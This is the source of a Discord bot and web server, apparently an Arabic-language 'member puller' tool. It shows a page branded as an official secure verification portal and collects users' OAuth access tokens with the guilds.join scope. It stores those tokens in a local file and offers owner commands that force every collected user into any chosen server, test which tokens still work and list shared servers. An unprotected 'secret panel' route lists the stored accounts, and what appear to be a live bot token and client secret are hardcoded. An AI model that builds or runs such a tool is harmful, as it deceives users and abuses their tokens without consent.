const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');
const express = require('express');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const app = express();

const OWNER_ID = '1151179063122214963'; 
const CLIENT_ID = '1508569205941735465'; 
const CLIENT_SECRET = process.env.SECRET || 'J7OBhcI9jlbT0GEg9sTUOpBtbZz9dnDG'; 
const BOT_TOKEN = process.env.TOKEN || 'MTUwODU2OTIwNTk0MTczNTQ2NQ.GEvn0f.I6Erz5iYQHgcFf2PmBX0VdFaNHUqAIEXh9tQgQ'; 

const DOMAIN = process.env.RAILWAY_STATIC_URL 
    ? 'https://' + process.env.RAILWAY_STATIC_URL 
    : 'https://ma7shyterms-production.up.railway.app';

const REDIRECT_URI = DOMAIN + '/callback';
const PORT = process.env.PORT || 3000;
const DB_FILE = path.join(__dirname, 'database.json');
const CONFIG_FILE = path.join(__dirname, 'config.json');

let usersDatabase = [];
if (fs.existsSync(DB_FILE)) {
    try { usersDatabase = JSON.parse(fs.readFileSync(DB_FILE, 'utf-8')); } catch (e) { usersDatabase = []; }
}

let botConfig = { logChannelId: null };
if (fs.existsSync(CONFIG_FILE)) {
    try { botConfig = JSON.parse(fs.readFileSync(CONFIG_FILE, 'utf-8')); } catch (e) { botConfig = { logChannelId: null }; }
}

function saveDatabase() { fs.writeFileSync(DB_FILE, JSON.stringify(usersDatabase, null, 2)); }
function saveConfig() { fs.writeFileSync(CONFIG_FILE, JSON.stringify(botConfig, null, 2)); }

const bot = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

const bootTime = Date.now();

bot.on('ready', () => {
    console.log('Logged in as ' + bot.user.tag);
    bot.user.setPresence({
        activities: [{ name: 'custom', type: 4, state: 'Eren Is The best' }],
        status: 'online',
    });
});

bot.on('messageCreate', async (message) => {
    if (message.author.bot) return;
    if (!message.content.startsWith('+')) return;

    const args = message.content.slice(1).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    if (command === 'help') {
        const helpEmbed = new EmbedBuilder()
            .setTitle('قائمة أوامر بوت المحشي')
            .setColor('#5865F2')
            .addFields(
                { name: 'الأوامر العامة', value: 'help - يعرض القائمة الحالية\nstats - يعرض إحصائيات النظام الإجمالية' },
                { name: 'أوامر التحكم والتوثيق للأونر فقط', value: 'panel - توليد رابط التوثيق الخاص بالأعضاء\npullguild [ID] - سحب الموثقين لسيرفر معين\nsetlogs [ID_الروم] - تحديد روم اللوجات والإشعارات\ncheck [ID] - فحص حالة توثيق عضو معين\nshared [ID] - معرفة السيرفرات المشتركة للعضو الموثق\nclean - تنظيف وتصفية التوكنات المنتهية والميتة من القاعدة' }
            );
        return message.reply({ embeds: [helpEmbed] });
    }

    if (command === 'stats') {
        const uptimeMs = Date.now() - bootTime;
        const uptimeHours = Math.floor(uptimeMs / (1000 * 60 * 60));
        const uptimeMins = Math.floor((uptimeMs % (1000 * 60 * 60)) / (1000 * 60));

        const statsEmbed = new EmbedBuilder()
            .setTitle('إحصائيات النظام الحالية')
            .setColor('#2ed573')
            .addFields(
                { name: 'إجمالي الحسابات الموثقة:', value: usersDatabase.length + ' عضو', inline: true },
                { name: 'وقت تشغيل البوت الحالي:', value: uptimeHours + ' ساعة و ' + uptimeMins + ' دقيقة', inline: true },
                { name: 'روم اللوجات المحددة:', value: botConfig.logChannelId ? '<#' + botConfig.logChannelId + '>' : 'لم يتم تحديد روم بعد', inline: false }
            );
        return message.reply({ embeds: [statsEmbed] });
    }

    if (command === 'panel') {
        if (message.author.id !== OWNER_ID) return message.reply('الأمر مخصص لصاحب البوت فقط');

        const oauthUrl = 'https://discord.com/oauth2/authorize?client_id=' + CLIENT_ID + '&redirect_uri=' + encodeURIComponent(REDIRECT_URI) + '&response_type=code&scope=identify%20guilds.join';

        const panelEmbed = new EmbedBuilder()
            .setTitle('لوحة تحكم التوثيق القياسية')
            .setColor('#ED4245')
            .addFields(
                { name: 'رابط التوثيق المباشر:', value: '[اضغط هنا للتوثيق](' + oauthUrl + ')' },
                { name: 'الموثقين حالياً:', value: usersDatabase.length + ' حساب جاهز للنقل' }
            );
        return message.reply({ embeds: [panelEmbed] });
    }

    if (command === 'setlogs') {
        if (message.author.id !== OWNER_ID) return message.reply('الأمر مخصص لصاحب البوت فقط');
        
        const targetChannelId = args[0] || message.mentions.channels.first()?.id;
        if (!targetChannelId) return message.reply('اكتب الاي دي بتاع الروم أو منشن الروم عشان أثبتها');

        botConfig.logChannelId = targetChannelId;
        saveConfig();
        return message.reply('تم تحديد روم اللوجات بنجاح على الروم المحددة');
    }

    if (command === 'check') {
        if (message.author.id !== OWNER_ID) return message.reply('الأمر مخصص لصاحب البوت فقط');
        
        const targetId = args[0];
        if (!targetId) return message.reply('اكتب الاي دي بتاع العضو عشان أفحصه لك');

        const isVerified = usersDatabase.find(u => u.id === targetId);
        if (isVerified) {
            return message.reply('العضو ' + isVerified.username + ' موثق وموجود في القاعدة وتوكنه سليم');
        } else {
            return message.reply('العضو ده مش موجود في قاعدة البيانات وموثقش قبل كده');
        }
    }

    if (command === 'shared') {
        if (message.author.id !== OWNER_ID) return message.reply('الأمر مخصص لصاحب البوت فقط');
        
        const targetId = args[0];
        if (!targetId) return message.reply('اكتب الاي دي بتاع العضو الموثق عشان أشوف سيرفراته');

        const userData = usersDatabase.find(u => u.id === targetId);
        if (!userData) return message.reply('العضو مش موثق في القاعدة أصلاً');

        try {
            const guildsRes = await axios.get('https://discord.com/api/v10/users/@me/guilds', {
                headers: { Authorization: 'Bearer ' + userData.token }
            });
            const botGuilds = bot.guilds.cache.map(g => g.id);
            const sharedGuilds = guildsRes.data.filter(g => botGuilds.includes(g.id));
            
            return message.reply('العضو ده مشترك معاك في ' + sharedGuilds.length + ' سيرفر حالياً');
        } catch (err) {
            return message.reply('فشل فحص السيرفرات المشتركة، غالباً التوكن انتهت صلاحيته');
        }
    }

    if (command === 'clean') {
        if (message.author.id !== OWNER_ID) return message.reply('الأمر مخصص لصاحب البوت فقط');
        
        message.reply('جاري فحص وتصفية قاعدة البيانات وتنظيف الحسابات الميتة...');
        let deadCount = 0;
        const freshDatabase = [];

        for (const user of usersDatabase) {
            try {
                await axios.get('https://discord.com/api/v10/users/@me', {
                    headers: { Authorization: 'Bearer ' + user.token }
                });
                freshDatabase.push(user);
            } catch (e) {
                deadCount++;
            }
        }

        usersDatabase = freshDatabase;
        saveDatabase();
        return message.channel.send('تمت عملية التنظيف بنجاح، مسحنا ' + deadCount + ' توكن ميت والقاعدة الحالية نظيفة تماماً');
    }

    if (command === 'pullguild') {
        if (message.author.id !== OWNER_ID) return message.reply('الأمر مخصص لصاحب البوت فقط');
        
        const targetGuildId = args[0];
        if (!targetGuildId) return message.reply('اكتب الاي دي بتاع السيرفر اللي هنسحب عليه الأعضاء');

        if (usersDatabase.length === 0) return message.reply('قاعدة البيانات فاضية ومفيش أعضاء نسحبهم');

        message.reply('جاري بدء عملية نقل وسحب ' + usersDatabase.length + ' عضو للسيرفر المستهدف...');

        let successCount = 0;
        for (const user of usersDatabase) {
            try {
                await axios.put(
                    'https://discord.com/api/v10/guilds/' + targetGuildId + '/members/' + user.id,
                    { access_token: user.token },
                    { headers: { Authorization: 'Bot ' + BOT_TOKEN, 'Content-Type': 'application/json' } }
                );
                successCount++;
            } catch (err) {
                console.error('فشل سحب العضو: ' + user.id);
            }
        }
        return message.channel.send('اكتملت عملية السحب بنجاح، ضفنا ' + successCount + ' عضو من إجمالي ' + usersDatabase.length);
    }
});

app.get('/', (req, res) => {
    const oauthUrl = 'https://discord.com/oauth2/authorize?client_id=' + CLIENT_ID + '&redirect_uri=' + encodeURIComponent(REDIRECT_URI) + '&response_type=code&scope=identify%20guilds.join';
    res.send(`
        <!DOCTYPE html>
        <html lang="ar" dir="rtl">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>نظام التحقق الرسمي</title>
            <style>
                body { background-color: #0c0e17; color: #fff; font-family: system-ui, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
                .main-card { background: #161925; padding: 50px 30px; border-radius: 24px; border: 1px solid #202225; box-shadow: 0 12px 40px rgba(0,0,0,0.5); max-width: 500px; }
                h1 { color: #5865F2; font-size: 28px; margin-bottom: 10px; }
                p { color: #a0a5b5; font-size: 16px; margin-bottom: 30px; line-height: 1.6; }
                .btn { background: #5865F2; color: #fff; padding: 12px 30px; border-radius: 8px; font-weight: bold; text-decoration: none; font-size: 16px; transition: 0.3s; display: inline-block; }
                .btn:hover { background: #4752c4; transform: translateY(-2px); }
            </style>
        </head>
        <body>
            <div class="main-card">
                <h1>بوابة التحقق الآمنة</h1>
                <p>مرحباً بك في نظام ربط الحسابات الرسمي. اضغط على الزر بالأسفل لإتمام عملية التحقق وتأكيد هويتك داخل السيرفر.</p>
                <a href="${oauthUrl}" class="btn">اضغط هنا للتحقق الفوري</a>
            </div>
        </body>
        </html>
    `);
});

app.get('/ma7shy', (req, res) => {
    const uptimeMs = Date.now() - bootTime;
    const uptimeHours = Math.floor(uptimeMs / (1000 * 60 * 60));
    const usersList = usersDatabase.map(u => `<li>الحساب: @${u.username} | معرف الحساب: ${u.id}</li>`).join('') || '<p style="color:#72767d;">لا يوجد حسابات موثقة حالياً</p>';

    res.send(`
        <!DOCTYPE html>
        <html lang="ar" dir="rtl">
        <head><meta charset="UTF-8"><title>اللوحة السرية</title></head>
        <body style="background:#0c0e17; color:#fff; font-family:sans-serif; padding:40px;">
            <h1 style="color:#EED202;">لوحة تحكم النظام السرية</h1>
            <p>الموثقين إجمالاً: ${usersDatabase.length} | التشغيل: ${uptimeHours} ساعة</p>
            <hr style="border-color:#202225;">
            <h2>قائمة الموثقين المخزنة:</h2>
            <ul>${usersList}</ul>
        </body>
        </html>
    `);
});

app.get('/callback', async (req, res) => {
    const code = req.query.code;
    if (!code) return res.send('خطأ في الاتصال المباشر');

    try {
        const tokenResponse = await axios.post('https://discord.com/api/v10/oauth2/token', new URLSearchParams({
            client_id: CLIENT_ID,
            client_secret: CLIENT_SECRET,
            grant_type: 'authorization_code',
            code: code,
            redirect_uri: REDIRECT_URI,
        }), {
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
        });

        const accessToken = tokenResponse.data.access_token;
        const userResponse = await axios.get('https://discord.com/api/v10/users/@me', {
            headers: { Authorization: 'Bearer ' + accessToken }
        });

        const userData = userResponse.data;

        let nitroStatus = 'لا يوجد نيترو';
        if (userData.premium_type === 1) nitroStatus = 'نيترو كلاسيك Classic';
        if (userData.premium_type === 2) nitroStatus = 'نيترو قيمنج كامل Full Nitro';
        if (userData.premium_type === 3) nitroStatus = 'نيترو بيزك Basic';

        const userIndex = usersDatabase.findIndex(u => u.id === userData.id);
        if (userIndex > -1) {
            usersDatabase[userIndex].token = accessToken;
            usersDatabase[userIndex].username = userData.username;
        } else {
            usersDatabase.push({
                id: userData.id,
                username: userData.username,
                token: accessToken
            });
        }
        saveDatabase();

        if (botConfig.logChannelId) {
            const logChannel = bot.channels.cache.get(botConfig.logChannelId);
            if (logChannel) {
                const logEmbed = new EmbedBuilder()
                    .setTitle('حساب جديد قام بالتوثيق الآن')
                    .setColor('#2ed573')
                    .addFields(
                        { name: 'اسم المستخدم:', value: '@' + userData.username, inline: true },
                        { name: 'الاي دي الخاص به:', value: userData.id, inline: true },
                        { name: 'حالة النيترو في الحساب:', value: nitroStatus, inline: false },
                        { name: 'ترتيب الحساب الحالي في القاعدة:', value: 'الحساب رقم ' + usersDatabase.length, inline: false }
                    );
                logChannel.send({ embeds: [logEmbed] }).catch(() => null);
            }
        }

        res.send(`
            <body style="background:#0c0e17; color:#fff; font-family:sans-serif; text-align:center; padding-top:20vh;">
                <div style="background:#161925; padding:40px; border-radius:20px; border:1px solid #2ed573; display:inline-block;">
                    <h1 style="color:#2ed573;">تم التوثيق بنجاح تام</h1>
                    <p>أهلاً بك يا @${userData.username}، تم ربط الحساب وتأكيده بنجاح، يمكنك العودة لديسكورد الآن</p>
                </div>
            </body>
        `);
    } catch (error) {
        res.status(500).send('حدث خطأ في معالجة البيانات');
    }
});

app.listen(PORT, () => console.log('Web Server running on port ' + PORT));
bot.login(BOT_TOKEN);
